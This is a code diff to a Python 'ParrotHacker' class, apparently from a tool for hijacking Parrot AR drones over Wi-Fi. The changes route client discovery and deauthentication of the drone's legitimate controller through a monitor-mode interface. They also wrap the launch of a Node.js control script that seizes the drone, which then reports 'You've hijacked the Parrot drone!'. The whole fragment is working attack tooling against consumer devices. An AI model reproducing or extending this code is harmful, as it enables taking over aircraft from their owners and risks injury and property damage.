@@ -29,10 +29,11 @@ controljs_dir = "ardrone-webflight"
 
 class ParrotHacker:
 
-    def __init__(self, wlan, parrot_ap):
+    def __init__(self, parrot_ap, wlan, mon):
         """ Initialize the Parrot hacker class. """
         # Init vars
         self.wlan = wlan
+        self.mon  = mon
         self.ap   = parrot_ap
         self.clients = []
 
@@ -83,7 +84,7 @@ class ParrotHacker:
 
     def search_new_clients(self):
         disp.info("Searching for connected clients to Parrot AP", self.ap.ssid)
-        self.wlan.search_clients(self.ap, self.register_client)
+        self.mon.search_clients(self.ap, self.register_client)
 
 
     def register_client(self, client):
@@ -113,8 +114,10 @@ class ParrotHacker:
 
         if ip_ok:
             disp.info("Taking drone control")
-            do("cd", controljs_dir, ';', nodejs, controljs, force_output=True)
-
+            try:
+                do("cd", controljs_dir, ';', nodejs, controljs, force_output=True)
+            except KeyboardInterrupt:
+                pass
             disp.info("Well done! You've hijacked the Parrot drone! :)")
 
 
@@ -122,7 +125,7 @@ class ParrotHacker:
         """ Disconnects a client then take control. """
         # Disconnect client
         disp.info("Disconnecting client", client)
-        self.wlan.deauth_client(client, self.ap)
+        self.mon.deauth_client(client, self.ap)
 
         # Take control
         self.take_control()
